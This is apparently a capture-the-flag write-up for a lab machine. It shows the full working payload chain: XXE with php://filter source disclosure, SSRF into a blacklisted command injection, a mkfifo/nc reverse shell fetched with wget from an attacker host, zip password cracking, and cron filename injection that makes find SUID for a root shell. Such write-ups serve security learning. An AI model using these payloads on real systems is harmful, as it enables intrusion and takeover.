## Nmap

![](images/scare/nmap.png)

Only two ports are open. Let's start with HTTP service.

***

## HTTP

When we visit the website running on port 80 we are greeted with `Apache2 Default page.`

![](images/scare/website.png)

I ran gobuster on the website and found a directory named `scarecrow`

![](images/scare/gobust.png)

That page had a directory listing of two PHP files.

![](images/scare/dir.png)

Now if we visit the personal secret page we'll get the error saying only admin can access this etc etc.

But if we open the `login.php` we are given an input field but the problem with this was no matter what we end we get `user '' not found`.

![](images/scare/login.png)

![](images/scare/error.png)

I captured the requests in burp suite and tried lot of tricks to figure out a way like using `X-Forwarded-For` or using `SSRF` to access personal secret admin page. But then [@theart42](https://twitter.com/theart42) figured out that it was XXE.

I tried the usual XXE payload from [PayloadsAllTheThing/XXE Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection) but that didn't worked then but if we URL encoded certain character and it will work.

```
<%3fxml+version%3d"1.0"%3f><!DOCTYPE+root+[<!ENTITY+test+SYSTEM+'file%3a///etc/passwd'>]><root><user>%26test%3b</user></root>
```

![](images/scare/passwd.png)

I tried changing the path to `var/www/html/scarecrow/personal_secret_admin_page.php` but that didn't worked. Again [@theart42]()
said to use `php://filter/convert.base64-encode/resource=`.

```
auth=<%3fxml+version%3d"1.0"%3f><!DOCTYPE+root+[<!ENTITY+test+SYSTEM+'php://filter/convert.base64-encode/resource=/var/www/html/scarecrow/personal_secret_admin_page.php'>]><root><user>%26test%3b</user></root>
```

![](images/scare/source.png)

After decoding the base64 we'll get

```php
<?php
$ip = $_SERVER['REMOTE_ADDR'];
if($ip === "127.0.0.1"){
  echo "Hello Admin!";
}
else{
  die("only admin can access here! and you are not: 127.0.0.1");
}
//because blacklists are awesome!!!
$blacklist = array("$","&","|","(",")","`","-","{","}",";",">","<");
if(isset($_GET["ip"])) {
  $ip = $_GET["ip"];
  foreach ($blacklist as $key) {
    if(strpos($ip, $key) !== false){
      die("bad character in ip!!!");
    }
  }
  system("ping -c 4 ". $ip);
}
?>

<html>
<body>
<h2>Admin panel page</h2>
  <form id="myForm" >
    <input type="text" name="ip">
    <input type="submit">
  </form>
</html>
```

Same way we can read the source of `login.php`

```php
<?php
if(isset($_POST["auth"])) {
    libxml_disable_entity_loader (false);
    $xml = $_POST["auth"];
    $dom = new DOMDocument();
    $dom->loadXML($xml, LIBXML_NOENT | LIBXML_DTDLOAD);
    $creds = simplexml_import_dom($dom);
    $user = $creds->user;
    $pass = $creds->pass;
    if($pass === "super_secure_password" && $user === "admin"){
      echo "<html><body><div>You are logged in as user <b>admin</b><br>";
      echo "You can go to the admin page now: <br><a href='http://localhost/personal_secret_admin_page.php'>http://localhost/personal_secret_admin_page.php</a></body></html>";
    }
    else{
      echo "User '" . $user ."' not found!";
    }
}
else {
  echo "<html><body><div><form method='POST'><input type='text' name='auth'><br><input type='submit'></form></div></body></html>";
}
?>
```

So we have the source of that secret page. We can see that it's a classic command injection because it is taking the `$ip` to the `system()` but the problem is that `blacklist` because it contains almost every command line character.

This can be done by doing `%0als` in the end. This basically add a `\n` to the end of the command and then runs our command. The main problem here was a proper way to do it while bypassing that IP check also.

It took us few hours but in the end [@4ndr34z]() figure it out.

```

auth=<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE creds [ <!ELEMENT creds ANY ><!ENTITY xxe SYSTEM 'php://filter/convert.base64-encode/resource=http://127.0.0.1/scarecrow/personal_secret_admin_page.php?ip=192.168.56.118%250Als' >]><creds><user>%26xxe;</user><pass>pass</pass></creds>
```

![](images/scare/ls.png)

__NOTE__: The IP is your machine's IP. Also every payload has to be double URL encoded.

Now we have the RCE, we can execute our commands. I tried the `nc -e /bin/sh IP PORT` to get reverse shell but that didn't work.

Now here are two ways to do it:

* Generate shell via msfvenom and then wget it and listen via nc or msfconsole. - suggested by [@theart42]()
* Make a shell script having reverse shell code, wget it on the server, chmod it and then execute. - suggested by [@4ndr34z]()

I did the 2nd way.

I made a file name `shell` with the following content

```bash
mkfifo /tmp/grpoa; nc 192.168.56.1 1337 0</tmp/grpoa | /bin/sh >/tmp/grpoa 2>&1; rm /tmp/grpoa
```

Now do the following:


* `wget http://192.168.56.1:8000/shell`


```
auth=<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE creds [ <!ELEMENT creds ANY ><!ENTITY xxe SYSTEM 'php://filter/convert.base64-encode/resource=http://127.0.0.1/scarecrow/personal_secret_admin_page.php?ip=192.168.56.118%250Awget%2520http%253A%252F%252F192.158.56.1%253A8000%252Fshell' >]><creds><user>%26xxe;</user><pass>pass</pass></creds>

```

* `chmod +x shell`

```
auth=<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE creds [ <!ELEMENT creds ANY ><!ENTITY xxe SYSTEM 'php://filter/convert.base64-encode/resource=http://127.0.0.1/scarecrow/personal_secret_admin_page.php?ip=192.168.56.118%250Achmod%2520%252Bx%2520shell' >]><creds><user>%26xxe;</user><pass>pass</pass></creds>
```

* `./shell` while `nc` listener is running

```
auth=<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE creds [ <!ELEMENT creds ANY ><!ENTITY xxe SYSTEM 'php://filter/convert.base64-encode/resource=http://127.0.0.1/scarecrow/personal_secret_admin_page.php?ip=192.168.56.118%250A.%252Fshell' >]><creds><user>%26xxe;</user><pass>pass</pass></creds>
```

__NOTE__: All the data is __DOUBLE__ Url encoded. Also we have to do this on `/login.php` and not on `/scarecrow/personal_secret_admin_page.php`. I wasted few hours trying payload there. ü§¶‚Äç‚ôÇÔ∏è

If everything is done properly we'll have a shell

## Horizontal Privilege Escalation

Since I was in the system I ran the enumeration script but found nothing with it. I tried to run `sudo -l` but we didn't had any TTY shell.

So I ran `pspy32` and with that I found a process in the background, a cronjob

![](images/scare/cron.png)

***

So this cron is for vertical privilege escalation. The author messed up the machine. So basically there is a directory named `/var/www/paw-sk4-experiments` which was supposed to be accessed by us to find an image but due some mess up we couldn't `cd` to that dir.

![](images/scare/denied.png)

So author sent us the image. If you are using the fied version of machine you must be able to access that dir.

***

This is the image that we get from that directory:

![](images/scare/personal_backup.jpeg)

I ran strings on that image, it had some `password.txt` in it. I ran `binwalk` to extract it.

![](images/scare/binwalk.png)

Actually it was zip file which was password protected so I used john to crack the hash.

To extract the hash run `zip2john file.zip > hash.txt` and then run john the ripper.

![](images/scare/crack.png)

From this we got a file named `password.txt` which had the password `#beautifull_root1999!`.

I used this password with use `paw-sk4` to login via SSH. And in the home dir I found the `flag.txt`

![](images/scare/user.png)

***

## Veritcal Privilege escalation

Now we are user on this machine and along with the `flag.txt` we had a file named `backup.py` so assuming this is the file similar to what is present in `root/` which we saw in the cron job.

![](images/scare/cron.png)

We can see the content of `backup.py`

![](images/scare/backup-src.png)

So here we can see the issue with `os.system()`, the second one.

```python
        os.system('cp "' + path + file + '" ' + path_bak)
```

In this the variable `file` is directorly used in the `os.system` so if we can name a file with certain command in `/var/www/paw-sk4-experiments` and leave it to be runned by cronjob it can give us access to root shell.

[@4ndr34z](https://twitter.com/4nqr34z) and [@thart42](https://twitter.com/theart42) figured out this part. They changed the permission of the `find` command to `4755` and then used `find` to get a root shell.

* `touch ./'"";$(chmod 4755 $(which find))'`
    - This will change the permission for `find` to `4755`
* Wait for sometime for cron to run. Then,
* `find . -exec /bin/sh -p \; -quit`

If this works then we'll have the root-shell

![](images/scare/root-shell.png)

Now we can cat the flag.

This was an awesome machine and I learned a lot from this one. I learned a great deal of XXE and this Privelge escalation method was really awesome and very different from most of the machines I've done.

Thanks to   [Daniele](https://twitter.com/@sk4pwn), [fabio](https://twitter.com/@bytevsbyt3), [p4w](https://twitter.com/@p4w16) for making this awesome machine.

Thanks to [@theart42](https://twitter.com/theart42), [@DCAU7](https://twitter.com/DCAU7), [@4nqr34z](https://twitter.com/4nqr34z), [@D4mianWayne](https://twitter.com/D4mianWayne) for this awesome team work.
